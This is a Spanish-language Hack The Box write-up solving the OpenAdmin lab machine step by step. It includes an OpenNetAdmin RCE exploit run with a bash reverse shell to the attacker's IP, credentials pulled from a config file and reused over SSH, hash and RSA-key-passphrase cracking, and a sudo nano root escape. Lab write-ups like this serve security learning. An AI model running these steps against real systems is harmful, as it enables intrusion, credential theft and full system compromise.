---
title: OpenAdmin
date: 2025-12-29 01:00:00 +0200
categories: [writeup, hackthebox]
tags: [hackthebox, openadmin ]     
image:
    path: https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/5b00db157dbbd7099ff6c0ef10f910ea.png
    alt: Hack The Box
---

> OpenAdmin
Linux · Easy 

## Task 1

There are three directories on the webserver. /artwork, sierra, and what else?

```shell
┌──(pmartinezr㉿kali)-[~]
└─$ dirsearch -u http://10.129.27.77                        
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/pmartinezr/reports/http_10.129.27.77/_25-12-28_22-21-16.txt

Target: http://10.129.27.77/

[22:21:16] Starting: 
[22:21:20] 403 -  277B  - /.ht_wsr.txt                                      
[22:21:20] 403 -  277B  - /.htaccess.bak1                                   
[22:21:20] 403 -  277B  - /.htaccess.orig
[22:21:20] 403 -  277B  - /.htaccess.sample
[22:21:20] 403 -  277B  - /.htaccess.save
[22:21:20] 403 -  277B  - /.htaccess_orig                                   
[22:21:20] 403 -  277B  - /.htaccess_extra
[22:21:20] 403 -  277B  - /.htaccess_sc                                     
[22:21:20] 403 -  277B  - /.htaccessBAK
[22:21:20] 403 -  277B  - /.htaccessOLD2
[22:21:20] 403 -  277B  - /.htaccessOLD                                     
[22:21:20] 403 -  277B  - /.htm
[22:21:20] 403 -  277B  - /.html                                            
[22:21:20] 403 -  277B  - /.htpasswd_test                                   
[22:21:20] 403 -  277B  - /.htpasswds                                       
[22:21:20] 403 -  277B  - /.httr-oauth
[22:21:21] 403 -  277B  - /.php                                             
[22:21:58] 301 -  312B  - /music  ->  http://10.129.27.77/music/            
[22:22:00] 301 -  310B  - /ona  ->  http://10.129.27.77/ona/                
[22:22:11] 403 -  277B  - /server-status                                    
[22:22:11] 403 -  277B  - /server-status/

```

Despista un poco el hecho de que no encuentra los directorios nombrados ```/artwork``` ni ```/sierra```, pero si encuentra otros dos ```/music``` y ```/ona``` opté por contestar music y acerté.

> /music

## Task 2

On the page at /music, there is a link that doesn't point to another link on /music, but rather an administration tool. What is the relative path?

Pues si nos fijamos en el enlace del botón ```Login``` nos dirige a ```/ona``` el otro descubrimiento que hicimos con dirsearch

> /ona

## Task 3

What is the version number of OpenNetAdmin that runs on the remote machine?

Ahora se entiende mejor la URL ```ona  = OpenNetAdmin```. Entramos en la web y aparece una especie de panel

```
 You are NOT on the latest release version
Your version    = v18.1.1
Latest version = Unable to determine
```

En la parte izquierda aparece la versión actual 

> 18.1.1

## Task 4

If you exploit this instance to get code execution on the machine, in the context of what user is the execution happening?

Encuentro un exploit en ruby que sí funciona [https://github.com/sec-it/OpenNetAdmin-RCE](https://github.com/sec-it/OpenNetAdmin-RCE)

```shell
┌──(pmartinezr㉿kali)-[~/htb/openadmin]
└─$ ruby exploit.rb exploit http://10.129.27.77/ona/ whoami                                                                 
[+] Command output:

www-data
```
Parece que tenemos un RCE. 

> www-data

## Task 5

What's the password of the user jimmy?

``` shell
┌──(pmartinezr㉿kali)-[~/htb/openadmin]
└─$ ruby exploit.rb exploit http://10.129.27.77/ona/ 'bash -c "bash -i >& /dev/tcp/10.10.14.110/4444 0>&1"' 
```

Preparamos shell reverse

``` shell
msf exploit(multi/handler) > run
[*] Started reverse TCP handler on 10.10.14.110:4444 
[*] Command shell session 1 opened (10.10.14.110:4444 -> 10.129.27.77:52056) at 2025-12-28 23:11:28 +0100


Shell Banner:
bash: cannot set terminal process group (1394): Inappropriate ioctl for device
bash: no job control in this shell
www-data@openadmin:/opt/ona/www$
-----
          

www-data@openadmin:/opt/ona/www$ 
```
Tenemos meterpreter 

```shell
www-data@openadmin:/var/www/ona/local/config$ cat database_settings.inc.php
cat database_settings.inc.php
<?php

$ona_contexts=array (
  'DEFAULT' => 
  array (
    'databases' => 
    array (
      0 => 
      array (
        'db_type' => 'mysqli',
        'db_host' => 'localhost',
        'db_login' => 'ona_sys',
        'db_passwd' => 'n1nj4W4rri0R!',
        'db_database' => 'ona_default',
        'db_debug' => false,
      ),
    ),
    'description' => 'Default data context',
    'context_color' => '#D3DBFF',
  ),
);

```
Navego un rato por los directorios hasta que encuentro el archivo de configuración de la base de datos para OpenNetAdmin ```n1nj4W4rri0R!```

``` shell
┌──(pmartinezr㉿kali)-[~/htb/openadmin]
└─$ ssh jimmy@10.129.27.77
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
jimmy@10.129.27.77's password: 
Last login: Thu Jan  2 20:50:03 2020 from 10.10.14.3
jimmy@openadmin:~$ 
``` 
Reutilizamos la clave encontrada para acceder por SSH

> n1nj4W4rri0R!

## Task 7

What's the name of the virtual host running under user "joanna"?

``` shell
jimmy@openadmin:/etc/apache2/sites-available$ cat internal.conf 
Listen 127.0.0.1:52846

<VirtualHost 127.0.0.1:52846>
    ServerName internal.openadmin.htb
    DocumentRoot /var/www/internal

<IfModule mpm_itk_module>
AssignUserID joanna joanna
</IfModule>

    ErrorLog ${APACHE_LOG_DIR}/error.log
    CustomLog ${APACHE_LOG_DIR}/access.log combined

</VirtualHost>
```

Buscamos en la configuraciones de apache y encuentro el archivo ```internal.conf```

> internal.openadmin.htb

## Task 8

What's the password for joanna on the internal vhost?

``` shell
jimmy@openadmin:/var/www/internal$ cat index.php 
```

``` shell
if ($_POST['username'] == 'jimmy' && hash('sha512',$_POST['password']) == '00e302ccdcf1c60b8ad50ea50cf72b939705f49f40f0dc658801b4680b7d758eebdc2e9f9ba8ba3ef8a8bb9a796d34ba2e856838ee9bdde852b8ec3b3a0523b1') {
```
Ahora encuentro un hash hardcodeado, una mala práctica, que genera estragos. 

Usando esta web [https://md5decrypt.net/en/Sha512/](https://md5decrypt.net/en/Sha512/) consigo la password 'Revealed'
Nota: No estoy muy de acuerdo con la pregunta de esta tarea, porque el usuario es ```jimmy``` y no ```joanna```. La pregunta correcta
debería ser ```What's the password for Jimmy on the internal vhost?``` 

> Revealed 

## Task 9 

What's the password for Joannas's private key?

```shell
ssh -L 8080:127.0.0.1:52846 jimmy@10.129.27.77
```
Creo un tunnel SSH haciendo forwarding hacia el puerto descrito de la apliación que corre con el usuario joanna que usare con la extensión 
FoxyProxy que tengo instalada en el navegador. 

Y ahora al acceder a la URL http://127.0.0.1:8080/main.php aparece una web con formulario

``` 
Enter Username and Password
Login Restricted.
```
Me logueo como jimmy y la password ```Revealed```


``` html
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,2AF25344B8391A25A9B318F3FD767D6D

kG0UYIcGyaxupjQqaS2e1HqbhwRLlNctW2HfJeaKUjWZH4usiD9AtTnIKVUOpZN8
ad/StMWJ+MkQ5MnAMJglQeUbRxcBP6++Hh251jMcg8ygYcx1UMD03ZjaRuwcf0YO
ShNbbx8Euvr2agjbF+ytimDyWhoJXU+UpTD58L+SIsZzal9U8f+Txhgq9K2KQHBE
6xaubNKhDJKs/6YJVEHtYyFbYSbtYt4lsoAyM8w+pTPVa3LRWnGykVR5g79b7lsJ
ZnEPK07fJk8JCdb0wPnLNy9LsyNxXRfV3tX4MRcjOXYZnG2Gv8KEIeIXzNiD5/Du
y8byJ/3I3/EsqHphIHgD3UfvHy9naXc/nLUup7s0+WAZ4AUx/MJnJV2nN8o69JyI
9z7V9E4q/aKCh/xpJmYLj7AmdVd4DlO0ByVdy0SJkRXFaAiSVNQJY8hRHzSS7+k4
piC96HnJU+Z8+1XbvzR93Wd3klRMO7EesIQ5KKNNU8PpT+0lv/dEVEppvIDE/8h/
/U1cPvX9Aci0EUys3naB6pVW8i/IY9B6Dx6W4JnnSUFsyhR63WNusk9QgvkiTikH
40ZNca5xHPij8hvUR2v5jGM/8bvr/7QtJFRCmMkYp7FMUB0sQ1NLhCjTTVAFN/AZ
fnWkJ5u+To0qzuPBWGpZsoZx5AbA4Xi00pqqekeLAli95mKKPecjUgpm+wsx8epb
9FtpP4aNR8LYlpKSDiiYzNiXEMQiJ9MSk9na10B5FFPsjr+yYEfMylPgogDpES80
X1VZ+N7S8ZP+7djB22vQ+/pUQap3PdXEpg3v6S4bfXkYKvFkcocqs8IivdK1+UFg
S33lgrCM4/ZjXYP2bpuE5v6dPq+hZvnmKkzcmT1C7YwK1XEyBan8flvIey/ur/4F
FnonsEl16TZvolSt9RH/19B7wfUHXXCyp9sG8iJGklZvteiJDG45A4eHhz8hxSzh
Th5w5guPynFv610HJ6wcNVz2MyJsmTyi8WuVxZs8wxrH9kEzXYD/GtPmcviGCexa
RTKYbgVn4WkJQYncyC0R1Gv3O8bEigX4SYKqIitMDnixjM6xU0URbnT1+8VdQH7Z
uhJVn1fzdRKZhWWlT+d+oqIiSrvd6nWhttoJrjrAQ7YWGAm2MBdGA/MxlYJ9FNDr
1kxuSODQNGtGnWZPieLvDkwotqZKzdOg7fimGRWiRv6yXo5ps3EJFuSU1fSCv2q2
XGdfc8ObLC7s3KZwkYjG82tjMZU+P5PifJh6N0PqpxUCxDqAfY+RzcTcM/SLhS79
yPzCZH8uWIrjaNaZmDSPC/z+bWWJKuu4Y1GCXCqkWvwuaGmYeEnXDOxGupUchkrM
+4R21WQ+eSaULd2PDzLClmYrplnpmbD7C7/ee6KDTl7JMdV25DM9a16JYOneRtMt
qlNgzj0Na4ZNMyRAHEl1SF8a72umGO2xLWebDoYf5VSSSZYtCNJdwt3lF7I8+adt
z0glMMmjR2L5c2HdlTUt5MgiY8+qkHlsL6M91c4diJoEXVh+8YpblAoogOHHBlQe
K1I1cqiDbVE/bmiERK+G4rqa0t7VQN6t2VWetWrGb+Ahw/iMKhpITWLWApA3k9EN
-----END RSA PRIVATE KEY-----

Don't forget your "ninja" password
Click here to logout Session 
```

Podemos convertir este archivo de clave RSA con la siguiente utilidad ```ssh2john``` nos permite convertir dicho archivo a un 
hash "crackeable" [https://keydecryptor.com/hash-tools/ssh2john](https://keydecryptor.com/hash-tools/ssh2john)

``` shell
┌──(pmartinezr㉿kali)-[~/htb/openadmin]
└─$ hashcat -m 22931 hash2 wordlist/rockyou.txt 
$sshng$1$16$2af25344b8391a25a9b318f3fd767d6d$1200$906d14608706c9ac6ea6342a692d9ed47a9b87044b94d72d5b61df25e68a5235991f8bac883f40b539c829550ea5937c69dfd2b4c589f8c910e4c9c030982541e51b4717013fafbe1e1db9d6331c83cca061cc7550c0f4dd98da46ec1c7f460e4a135b6f1f04bafaf66a08db17ecad8a60f25a1a095d4f94a530f9f0bf9222c6736a5f54f1ff93c6182af4ad8a407044eb16ae6cd2a10c92acffa6095441ed63215b6126ed62de25b2803233cc3ea533d56b72d15a71b291547983bf5bee5b0966710f2b4edf264f0909d6f4c0f9cb372f4bb323715d17d5ded5f83117233976199c6d86bfc28421e217ccd883e7f0eecbc6f227fdc8dff12ca87a61207803dd47ef1f2f6769773f9cb52ea7bb34f96019e00531fcc267255da737ca3af49c88f73ed5f44e2afda28287fc6926660b8fb0267557780e53b407255dcb44899115c568089254d40963c8511f3492efe938a620bde879c953e67cfb55dbbf347ddd677792544c3bb11eb0843928a34d53c3e94fed25bff744544a69bc80c4ffc87ffd4d5c3ef5fd01c8b4114cacde7681ea9556f22fc863d07a0f1e96e099e749416cca147add636eb24f5082f9224e2907e3464d71ae711cf8a3f21bd4476bf98c633ff1bbebffb42d24544298c918a7b14c501d2c43534b8428d34d500537f0197e75a4279bbe4e8d2acee3c1586a59b28671e406c0e178b4d29aaa7a478b0258bde6628a3de723520a66fb0b31f1ea5bf45b693f868d47c2d89692920e2898ccd89710c42227d31293d9dad740791453ec8ebfb26047ccca53e0a200e9112f345f5559f8ded2f193feedd8c1db6bd0fbfa5441aa773dd5c4a60defe92e1b7d79182af16472872ab3c222bdd2b5f941604b7de582b08ce3f6635d83f66e9b84e6fe9d3eafa166f9e62a4cdc993d42ed8c0ad5713205a9fc7e5bc87b2feeaffe05167a27b04975e9366fa254adf511ffd7d07bc1f5075d70b2a7db06f2224692566fb5e8890c6e39038787873f21c52ce14e1e70e60b8fca716feb5d0727ac1c355cf633226c993ca2f16b95c59b3cc31ac7f641335d80ff1ad3e672f88609ec5a4532986e0567e169094189dcc82d11d46bf73bc6c48a05f84982aa222b4c0e78b18cceb15345116e74f5fbc55d407ed9ba12559f57f37512998565a54fe77ea2a2224abbddea75a1b6da09ae3ac043b6161809b630174603f33195827d14d0ebd64c6e48e0d0346b469d664f89e2ef0e4c28b6a64acdd3a0edf8a61915a246feb25e8e69b3710916e494d5f482bf6ab65c675f73c39b2c2eecdca6709188c6f36b6331953e3f93e27c987a3743eaa71502c43a807d8f91cdc4dc33f48b852efdc8fcc2647f2e588ae368d69998348f0bfcfe6d65892aebb86351825c2aa45afc2e6869987849d70cec46ba951c864accfb8476d5643e7926942ddd8f0f32c296662ba659e999b0fb0bbfde7ba2834e5ec931d576e4333d6b5e8960e9de46d32daa5360ce3d0d6b864d3324401c4975485f1aef6ba618edb12d679b0e861fe5549249962d08d25dc2dde517b23cf9a76dcf482530c9a34762f97361dd95352de4c82263cfaa90796c2fa33dd5ce1d889a045d587ef18a5b940a2880e1c706541e2b523572a8836d513f6e688444af86e2ba9ad2ded540deadd9559eb56ac66fe021c3f88c2a1a484d62d602903793d10d:bloodninjas
```

## Submit User Flag

Submit the flag located in the joanna user's home directory.

``` shell
┌──(pmartinezr㉿kali)-[~/htb/openadmin]
└─$ chmod 600 rsa_key 
```
Antes de intentar el accesso por SSH debemos cambiar los permisos de el fichero de clave RSA para que no nos muestre el mensaje
``` shell
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@         WARNING: UNPROTECTED PRIVATE KEY FILE!          @
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
Permissions 0664 for 'rsa_key' are too open.
It is required that your private key files are NOT accessible by others.
This private key will be ignored.
```

``` shell
┌──(pmartinezr㉿kali)-[~/htb/openadmin]
└─$ ssh -i rsa_key joanna@10.129.27.77
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
Enter passphrase for key 'rsa_key': 
Last login: Tue Jul 27 06:12:07 2021 from 10.10.14.15

joanna@openadmin:~$ cat user.txt 
3249877dcd28c938************
```
Ahora sí, tenemos acceso por SSH y conseguimos la flag de usuario

> 3249877dcd28c938************

## Task 10 

What is the name of the binary (without path) that Joanna can run as root?

``` shell
joanna@openadmin:~$ sudo -l
Matching Defaults entries for joanna on openadmin:
    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR XFILESEARCHPATH XUSERFILESEARCHPATH",
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, mail_badpass

User joanna may run the following commands on openadmin:
    (ALL) NOPASSWD: /bin/nano /opt/priv
```
En sistemas linux siempre podemos consultar ```sudo -l``` para comprobar esta información y continuar la escalada de privilegios

> nano

## Submit Root Flag

Submit the flag located in root's home directory.

En [https://gtfobins.github.io/gtfobins/nano/](https://gtfobins.github.io/gtfobins/nano/) explican como hacer la escalada de privilegios
con ```nano```. Al igual que el editor ```vi``` se nos permite ejecutar cosas lo que hace muy peligroso permitir 
a un usuario ejecutarlo con permisos de superusuario.

```shell
sudo /bin/nano /opt/priv
```
Ahora dentro de nano hacemos lo que indica el exploit 

CTRL+R
CTRL+X
escribimos reset; sh 1>&0 2>&0
ENTER 

```shell
# cat /root/root.txt
4cd0f8fcb307b94e************
```

> 4cd0f8fcb307b94e************

[achivement](https://labs.hackthebox.com/achievement/machine/2336390/222)

Nota: este reto tiene un salto de la tarea 5 a la 7, parece que se olvidaron de la tarea 6.